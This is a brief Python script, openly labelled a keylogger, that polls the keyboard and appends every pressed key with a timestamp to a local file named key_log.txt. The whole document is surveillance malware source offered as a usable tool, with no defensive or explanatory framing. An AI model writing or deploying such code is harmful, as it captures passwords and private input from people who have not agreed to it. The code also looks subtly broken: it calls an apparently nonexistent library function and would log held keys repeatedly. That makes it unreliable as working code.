import keyboard
import datetime

# File to save keystrokes
log_file = "key_log.txt"

# Function to log a key press
def log_key(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} - {key}\n")

# Start listening for key events
print("Keylogger started. Press Ctrl+C to stop.")
try:
    while True:
        # Listen for key press events
        if keyboard.is_pressed('esc'):
            print("Stopping keylogger...")
            break
        # Log each key pressed
        for key in keyboard.get_keys_pressed():
            log_key(key)
except KeyboardInterrupt:
    print("Keylogger stopped.")
